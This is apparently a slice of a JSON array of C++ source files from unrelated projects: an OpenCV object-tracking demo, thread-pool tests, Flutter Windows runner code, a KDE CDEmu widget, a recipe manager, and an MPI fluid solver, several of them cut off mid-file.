\u8ba1\u7b97ROI\u7684\u76f4\u65b9\u56fe\n//    Mat roi_hist;\n//    int histSize = 180;\n//    float range[] = { 0, 180 };\n//    const float* histRange = { range };\n//    calcHist(&hsv_roi, 1, 0, mask, roi_hist, 1, &histSize, &histRange);\n//    normalize(roi_hist, roi_hist, 0, 255, NORM_MINMAX);\n\n    // \u5206\u79bbHSV\u901a\u9053\n    vector<Mat> hsv_channels;\n    split(hsv_roi, hsv_channels);\n    Mat hue_channel = hsv_channels[0]; // \u53d6H\u901a\u9053\n\n    cout << \"hue_channel.size() = \" << hue_channel.size() << endl;\n    // \u8f93\u51fahue_channel\u7684\u901a\u9053\u6570\n    cout << \"Hue channel type: \" << hue_channel.type() << endl;\n    cout << \"Hue channel channels: \" << hue_channel.channels() << endl;\n\n    // \u8ba1\u7b97H\u901a\u9053\u7684\u76f4\u65b9\u56fe\n    Mat roi_hist;\n    int histSize = 180;\n    float range[] = { 0, 180 };\n    const float* histRange = { range };\n    calcHist(&hue_channel, 1, 0, mask, roi_hist, 1, &histSize, &histRange,true, false);\n    normalize(roi_hist, roi_hist, 0, 255, NORM_MINMAX);\n\n    // \u8bbe\u7f6e\u8ffd\u8e2a\u53c2\u6570\n    TermCriteria term_crit(TermCriteria::EPS | TermCriteria::COUNT, 10, 1);\n\n    // \u5f00\u59cb\u5904\u7406\u89c6\u9891\n    while (true) {\n        Mat hsv, dst;\n        capture >> frame;\n        if (frame.empty()) break;\n\n        cvtColor(frame, hsv, COLOR_BGR2HSV);\n\n        vector<Mat> hsv_cs;\n        split(hsv, hsv_cs);\n        Mat hue_c = hsv_cs[0]; // \u53d6H\u901a\u9053\n\n\n        calcBackProject(&hue_c, 1, 0, roi_hist, dst, &histRange);\n\n        // \u4f7f\u7528MeanShift\u7b97\u6cd5\u8ddf\u8e2a\n        meanShift(dst, track_window, term_crit);\n\n        // \u753b\u51fa\u5b83\n        rectangle(frame, track_window, Scalar(0, 255, 0), 2);\n\n        // \u4f7f\u7528CamShift\u7b97\u6cd5\u8ddf\u8e2a\n        RotatedRect track_box = CamShift(dst, track_window, term_crit);\n\n        // \u753b\u51fa\u5b83\n        Point2f points[4];\n        track_box.points(points);\n        for (int i = 0; i < 4; i++)\n            line(frame, points[i], points[(i+1)%4], Scalar(0, 0, 255), 2);\n\n        imshow(\"Tracking\", frame);\n\n        // \u6309'q'\u9000\u51fa\n        if (waitKey(30) == 'q') break;\n    }\n\n    capture.release();\n    destroyAllWindows();\n    return 0;\n}\n",
    "#include<iostream>\n#include\"threadpool.h\"\n#include<thread>\n#include<chrono>\n#include<memory>\n#include\"threadpool.h\"\n\nusing ULong = unsigned long long;\n\n/*\n\u6709\u4e9b\u573a\u666f\u9700\u8981\u83b7\u53d6\u7ebf\u7a0b\u4efb\u52a1\u7684\u8fd4\u56de\u503c\n\u4e3e\u4f8b\uff1a\n1+2+....+100\n101+102+....+200\n201+202+....+300\nmain thread:\u7ed9\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u5206\u914d\u8ba1\u7b97\u533a\u95f4\uff0c\u5e76\u7b49\u5f85\u4ed6\u4eec\u8ba1\u7b97\u8fd4\u56de\u7ed3\u679c\uff0c\u7136\u540e\u5408\u5e76\u6700\u7ec8\u7ed3\u679c\n\n*/\n\nclass MyTask :public Task {\npublic:\n\tMyTask(ULong begin, ULong end)\n\t\t: begin_(begin)\n\t\t, end_(end)\n\t{}\n\t\n\tAny run() \n\t{\n\t\tstd::cout <<\"begin!\" << \" \" << \"tid:\" << std::this_thread::get_id() << std::endl;\n\t\tULong sum = 0;\n\t\tfor (ULong i = begin_; i <= end_; i++) {\n\t\t\tsum += i;\n\t\t}\n\t\tstd::cout <<\"end!\" << \" \" << \"tid:\" << std::this_thread::get_id() << std::endl;\n\t\treturn sum;\n\t}\nprivate:\n\tULong begin_;\n\tULong end_;\n};\n\nclass Tak: public Task {\npublic:\n\tAny run() {\n\t\tstd::cout << \"begin!\" << \"tid:\" << std::this_thread::get_id() << std::endl;\n\t\tstd::this_thread::sleep_for(std::chrono::seconds(1));\n\t\tstd::cout << \"end!\" << \"tid:\" << std::this_thread::get_id() << std::endl;\n\t\treturn 0;\n\t}\n\n};\n\n\nint main() {\n\t\n/*Test6\n\t\u5728\u4efb\u52a1\u63d0\u4ea4\u4e4b\u540e\u5c31\u51fa\u4f5c\u7528\u57df\u4e86\uff0c\u5f00\u59cb\u6267\u884c\u6790\u6784\u51fd\u6570\uff0c\u90a3\u4e48\u6ca1\u6267\u884c\u5b8c\u7684\u4efb\u52a1\u662f\u76f4\u63a5\u7ed3\u675f\u8fd8\u662f\u7b49\u6267\u884c\u5b8c\uff1f\n\t\u4fee\u6539\u4e3a\u6240\u6709\u4efb\u52a1\u6267\u884c\u5b8c\u624d\u80fd\u8fdb\u884c\u6790\u6784\n*/\n{\n\tThreadPool pool;\n\t//\u7528\u6237\u81ea\u5df1\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u5de5\u4f5c\u6a21\u5f0f\n\tpool.setMode(PoolMode::MODE_CACHED);\n\t//\u5f00\u59cb\u542f\u52a8\u7ebf\u7a0b\u6c60\n\tpool.start(4);\n\tResult res1 = pool.submitTask(std::make_shared<MyTask>(1, 100000000));\n\t/*ULong sum1 = res1.get().cast_<ULong>();\n\tstd::cout << sum1 << std::endl;*/\n}\n\n\n\n\t\n\n\t/*//Test5\n\t\u6b7b\u9501\u95ee\u9898\n\t* \u76ee\u524d\u8003\u8651\u5230\u4e86\u6b63\u5728\u6267\u884c\u548c\u6b63\u5728\u7b49\u5f85\u4e24\u79cd\u60c5\u5f62\u4e0b\u7684\u7ebf\u7a0b\u6790\u6784\uff0c\u672a\u8003\u8651\u5230\u5df2\u7ecf\u8fdb\u5165\u5faa\u73af\u7b49\u5f85\u62ff\u9501\u62a2\u4efb\u52a1\u7684\u7ebf\u7a0b\n\t* \u5728\u8fdb\u884c\u6790\u6784\u65f6\uff0c\u6790\u6784\u51fd\u6570\u548c\u7ebf\u7a0b\u6c60\u51fd\u6570\u540c\u65f6\u62a2\u5360\u9501\n\t* 1.pool\u7ebf\u7a0b\u5148\u83b7\u53d6\u5230-->\u963b\u585e-->\u8fdb\u5165\u7b49\u5f85\u72b6\u6001\uff0c\u6b64\u65f6\u91ca\u653e\u6389\u9501-->notEmpty()\u4e00\u76f4\u7b49\u5f85,\u8fdb\u5165\u6b7b\u9501\n\t* 2.\u7ebf\u7a0b\u51fd\u6570\u5148\u83b7\u53d6\u5230\uff0c\u6b64\u65f6\u4efb\u52a1\u961f\u5217\u4e3a\u7a7a\uff0c\u8fdb\u5165\u5faa\u73af\uff0c\u5219notEmpty()\u4e00\u76f4\u7b49\u5f85\uff0c\u8fdb\u5165\u6b7b\u9501\n\t\n\t{\n\t\tThreadPool pool;\n\t\t//\u7528\u6237\u81ea\u5df1\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u5de5\u4f5c\u6a21\u5f0f\n\t\tpool.setMode(PoolMode::MODE_CACHED);\n\t\t//\u5f00\u59cb\u542f\u52a8\u7ebf\u7a0b\u6c60\n\t\tpool.start(4);\n\t\tResult res1 = pool.submitTask(std::make_shared<MyTask>(1, 100000000));\n\t\tULong sum1 = res1.get().cast_<ULong>();\n\t\tstd::cout << sum1 << std::endl;\n\t}\n\tsystem(\"pause\");\n\n\t*/\n\t/*\n\tTest4\n\t*\n\tThreadPool \u5bf9\u8c61\u6790\u6784\u4e4b\u540e\uff0c\u600e\u4e48\u628a\u7ebf\u7a0b\u6c60\u76f8\u5173\u7684\u7ebf\u7a0b\u8d44\u6e90\u5168\u90e8\u56de\u6536\uff1f\n\t\n\t{\n\t\tThreadPool pool;\n\t\t//\u7528\u6237\u81ea\u5df1\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u5de5\u4f5c\u6a21\u5f0f\n\t\tpool.setMode(PoolMode::MODE_CACHED);\n\t\t//\u5f00\u59cb\u542f\u52a8\u7ebf\u7a0b\u6c60\n\t\tpool.start(4);\n\n\t\tResult res1 = pool.submitTask(std::make_shared<MyTask>(1, 100000000));\n\t\tResult res2 = pool.submitTask(std::make_shared<MyTask>(100000001, 200000000));\n\t\tResult res3 = pool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\t\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\t\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\t\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\t\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\t\tULong sum1 = res1.get().cast_<ULong>();\n\t\tULong sum2 = res2.get().cast_<ULong>();\n\t\tULong sum3 = res3.get().cast_<ULong>();\n\t\tstd::cout << (sum1 + sum2 + sum3) << std::endl;\n\t}\n\tsystem(\"pause\");\n\t*/\n\n\n\t/*\n\tTest3\n\tThreadPool pool;\n\t//\u7528\u6237\u81ea\u5df1\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u5de5\u4f5c\u6a21\u5f0f\n\tpool.setMode(PoolMode::MODE_CACHED);\n\t//\u5f00\u59cb\u542f\u52a8\u7ebf\u7a0b\u6c60\n\tpool.start(4);\n\n\tResult res1 = pool.submitTask(std::make_shared<MyTask>(1, 100000000));\n\tResult res2 = pool.submitTask(std::make_shared<MyTask>(100000001, 200000000));\n\tResult res3 = pool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\tULong sum1 = res1.get().cast_<ULong>();\n\tULong sum2 = res2.get().cast_<ULong>();\n\tULong sum3 = res3.get().cast_<ULong>();\n\n\t*/\n\n\n\t/*\n\t//Test2\n\tThreadPool pool;\n\tpool.start(4);\n\n\tResult res1 = pool.submitTask(std::make_shared<MyTask>(1, 100000000));\n\tResult res2 = pool.submitTask(std::make_shared<MyTask>(100000001, 200000000));\n\tResult res3 = pool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\n\tULong sum1 = res1.get().cast_<ULong>();\n\tULong sum2 = res2.get().cast_<ULong>();\n\tULong sum3 = res3.get().cast_<ULong>();\n\n\tstd::cout << (sum1+ sum2+ sum3) << std::endl;\n\t*/\n\n\t/*\n\tTest1\n\tThreadPool pool;\n\tpool.start(4);\n\tpool.submitTask(std::make_shared<Tak>());\n\tpool.submitTask(std::make_shared<Tak>());\n\tpool.submitTask(std::make_shared<Tak>());\n\tpool.submitTask(std::make_shared<Tak>());\n\tsystem(\"pause\");\n\t*/\n\treturn 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/****************************************************************************\n *                                                                          *\n *   This file is part of KDE CDEmu Manager.                                *\n *                                                                          *\n *   Copyright (C) 2009-2024 by Marcel Hasler <mahasler@gmail.com>          *\n *                                                                          *\n *   This program is free software; you can redistribute it and/or modify   *\n *   it under the terms of the GNU General Public License as published by   *\n *   the Free Software Foundation, either version 3 of the License, or      *\n *   (at your option) any later version.                                    *\n *                                                                          *\n *   This program is distributed in the hope that it will be useful,        *\n *   but WITHOUT ANY WARRANTY; without even the implied warranty of         *\n *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the           *\n *   GNU General Public License for more details.                           *\n *                                                                          *\n *   You should have received a copy of the GNU General Public License      *\n *   along with this program. If not, see <http://www.gnu.org/licenses/>.   *\n *                                                                          *\n ****************************************************************************/\n\n#include \"devicelistitem.h\"\n\n#include <KLocalizedString>\n\n#include <QHBoxLayout>\n\nDeviceListItem::DeviceListItem(int index)\n    : m_index(index),\n      m_widget(new QWidget),\n      m_label(new QLabel),\n      m_button(new QPushButton)\n{\n    setFlags(Qt::NoItemFlags);\n\n    m_button->setFixedWidth(30);\n    m_button->setFlat(true);\n\n    connect(m_button, SIGNAL(clicked()), this, SLOT(onButtonClicked()));\n\n    auto layout = new QHBoxLayout(m_widget);\n    layout->addWidget(m_label);\n    layout->addWidget(m_button);\n    layout->setContentsMargins(0, 0, 0, 0);\n    m_widget->setLayout(layout);\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nvoid DeviceListItem::setFileName(const QString& name)\n{\n    m_label->setText(name);\n\n    if (name.isEmpty())\n    {\n        m_button->setIcon(QIcon::fromTheme(\"document-open\"));\n        m_button->setToolTip(i18n(\"Select image file\"));\n    }\n    else\n    {\n        m_button->setIcon(QIcon::fromTheme(\"media-eject\"));\n        m_button->setToolTip(i18n(\"Unmount current image\"));\n\n    }\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nauto DeviceListItem::fileName() const -> QString\n{\n    return m_label->text();\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nauto DeviceListItem::widget() const -> QWidget*\n{\n    return m_widget;\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nvoid DeviceListItem::onButtonClicked()\n{\n    if (m_label->text().isEmpty())\n        emit mountClicked(m_index);\n    else\n        emit unmountClicked(m_index);\n}\n\n// ---------------------------------------------------------------------------------------------- //\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <limits> \n\nusing namespace std;\nconst int days = 7;\nconst int meals = 3;\nstring daysOfWeek[days] = {\"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\", \"Sunday\"};\nstruct Recipe\n{\n    vector<string> recipe;\n    int m = 0;\n};\n\nRecipe add_line_in_vector(const string &line)\n{\n    Recipe recipe;\n    stringstream get(line);\n    string temp;\n    while (getline(get, temp, ','))\n    {\n        if (temp != \"directions\")\n        {\n            recipe.m++; // Count the number of ingredients\n        }\n        else\n        {\n            // Stop parsing ingredients when \"directions\" is encountered\n        }\n        recipe.recipe.push_back(temp);\n    }\n    return recipe;\n}\n\nvoid searchRecipe(const string &file_name, const string &recipe_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        if (recipe_name == recipe.recipe[0])\n        {\n            flag = 1; // Recipe found\n            cout << \"Recipe Name: \" << recipe.recipe[0] << endl;\n            cout << \"Category: \" << recipe.recipe[1] << endl;\n            cout << \"Ingredients:\" << endl;\n            for (int i = 2; i < recipe.recipe.size(); ++i)\n            {\n                if (recipe.recipe[i] == \"directions\")\n                {\n                    cout << \"Directions :\" << endl;\n                }\n                else if (recipe.recipe[i] == \"Directions :\")\n                {\n                    continue;\n                }\n                else\n                    cout << \"-\"<<recipe.recipe[i] << endl;\n            }\n\n            break; // No need to continue searching after finding the recipe\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"Recipe not found.\" << endl;\n    }\n    file.close();\n}\nvoid display_recipe_category(const string &file_name) {\n    ifstream file(file_name);\n    if (!file.is_open()) {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n\n    string line;\n    while (getline(file, line)) {\n        Recipe recipe = add_line_in_vector(line);\n        cout << \"Recipe: \" << recipe.recipe[0] << \" - Category: \" << recipe.recipe[1] << endl;\n    }\n    \n    file.close();\n}\n\nvoid ingredientsearch(const string &file_name, const string &ingredient_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        for (int i = 2; i < recipe.m - 2; ++i)\n        {\n            if (ingredient_name == recipe.recipe[i])\n            {\n                flag = 1;\n                cout << recipe.recipe[0] << endl;\n            }\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"No recipe contain these ingredients.\" << endl;\n    }\n    file.close();\n}\n\nvoid recipe_adder(const string &rec_name, const string &rec_type, const string &rec_ings, const string &rec_steps, ofstream &tracker)\n{\n    tracker << rec_name << \",\" << rec_type << \",\" << rec_ings << \",directions,\" << rec_steps << endl;\n    tracker.seekp(-1, ios_base::cur);   //to move to the file pointer to starting of the file\n}\n\nvoid recipe_deleter(const string& filename, const string& recipe_name) {\n    ifstream infile(filename);\n    if (!infile) {\n        cerr << \"Error: Unable to open file \" << filename << endl;  //error  meassage\n        return;\n    }\n    //creating vector to hold strings\n    vector<string> lines;\n    string line;\n    \n    while (getline(infile, line)) {\n    if (line.find(recipe_name) == string::npos) {\n        lines.push_back(line);\n    }\n    else\n    cout << \"Recipe has been deleted.\" << endl;\n    }\n\n    infile.close();\n    ofstream outfile(filename);\n    if (!outfile) {\n        cout << \"Error: Unable to open file \" << filename << \" for writing.\" << endl;\n        return;\n    }\n    //writes the recipes to the file\n    for (const auto& l : lines) {\n        outfile << l << endl;\n    }\n    outfile.close();\n}\n\nvoid categorysearch(const string &file_name, const string &category_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n\n        if (category_name == recipe.recipe[1])\n        {\n            flag = 1;\n            cout << recipe.recipe[0] << endl;\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"No recipe is found of these category.\" << endl;\n    }\n    file.close();\n}\nvoid displayMP()\n{\n    ifstream file(\"Book.csv\");\n    if (!file.is_open())\n    {\n        cout << \"ERROR: Unable to ope",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\nusing namespace std;\n#include \"mpi.h\"\n#include <boost/program_options.hpp>\nnamespace po = boost::program_options;\n\n#include \"LidDrivenCavity.h\"\n\n/**\n * @brief Main function to solve the Lid Driven cavity Problem\n *\n * Main initialises MPI, creates a cartesian grid of ranks, sets up the problem and initialises variables, \n * then calls various functions to solve the problem and write the output.\n * \n * Uses conjugate gradient method to solve poisson equation, and explicit time integration.\n * Boundary conditions for the cavity problem are: \n * all velocities are 0 at all edges except top edge, where velocity is equal to U\n * \n * Uses MPI for coarse parallelisation and OpenMP for finer-grain parallelisation.\n * \n *\n * @param   argc    Parameter to initialise MPI\n * @param   argv    Array of arrays containing info on all the command line inputs, which are the problem specifications\n * @return  0       Return 0 upon succesful completion of the main routine.\n\n */\nint main(int argc, char **argv)\n{   \n    // Initialise MPI\n    int world_rank;\n    int world_size;\n    \n    MPI_Init(&argc,&argv);\n    MPI_Comm_rank( MPI_COMM_WORLD, &world_rank );\n    MPI_Comm_size( MPI_COMM_WORLD, &world_size );\n    \n    // Variable to check size of MPI, and needed later in domain division.\n    int n_rows = static_cast<int>(std::sqrt(world_size));\n    \n    // Make sure that the user input a P=p^2, perfect square number of ranks.\n    if (n_rows * n_rows != world_size) {\n        if (world_rank == 0) cerr << \"Error: The number of MPI ranks \" << world_size << \" is not a perfect square.\";\n        MPI_Finalize();\n        return 1; \n    }\n\n    // Initialise cartesian coordinates\n    MPI_Comm cart_comm;\n    int dims[2] = {n_rows, n_rows};                 // p rows * p cols\n    int periods[2] = {0, 0};                        // Non-periodic\n    int reorder = 1;                                // reordering\n    int coords[2];                               \n    MPI_Cart_create(MPI_COMM_WORLD, 2, dims, periods, reorder, &cart_comm);\n    MPI_Cart_coords(cart_comm, world_rank, 2, coords);\n\n    // Assign the default values for the optional command prompt inputs\n    po::options_description opts(\n        \"Solver for the 2D lid-driven cavity incompressible flow problem\");\n    opts.add_options()\n        (\"Lx\",  po::value<double>()->default_value(1.0),\n                 \"Length of the domain in the x-direction.\")\n        (\"Ly\",  po::value<double>()->default_value(1.0),\n                 \"Length of the domain in the y-direction.\")\n        (\"Nx\",  po::value<int>()->default_value(201),\n                 \"Number of grid points in x-direction.\")\n        (\"Ny\",  po::value<int>()->default_value(201),\n                 \"Number of grid points in y-direction.\")\n        (\"dt\",  po::value<double>()->default_value(0.005),\n                 \"Time step size.\")\n        (\"T\",   po::value<double>()->default_value(5),\n                 \"Final time.\")\n        (\"Re\",  po::value<double>()->default_value(1000),\n                 \"Reynolds number.\")\n        (\"verbose\",    \"Be more verbose.\")\n        (\"help\",       \"Print help message.\");\n\n    po::variables_map vm;\n    po::store(po::parse_command_line(argc, argv, opts), vm);\n    po::notify(vm);\n\n    // Help with problem inputs\n    if (vm.count(\"help\")) {\n        cout << opts << endl;\n        return 0;\n    }\n\n    // Instantiate LDC class as solver\n    LidDrivenCavity* solver = new LidDrivenCavity();\n    \n    // Set the problem specifications\n    solver->SetDomainSize(vm[\"Lx\"].as<double>(), vm[\"Ly\"].as<double>());\n    solver->SetGridSize(vm[\"Nx\"].as<int>(),vm[\"Ny\"].as<int>());\n    solver->SetTimeStep(vm[\"dt\"].as<double>());\n    solver->SetFinalTime(vm[\"T\"].as<double>());\n    solver->SetReynoldsNumber(vm[\"Re\"].as<double>());\n    \n    // Set the problem MPI so it is accessible all throughout the class\n    solver->SetMPI(cart_comm);\n   \n   \n    // Compute each rank's local domain portion\n    int rows_per_rank = vm[\"Nx\"].as<int>() / n_rows;\n    int extra_rows = vm[\"Nx\"].as<int>() % n_rows;\n    int cols_per_rank = 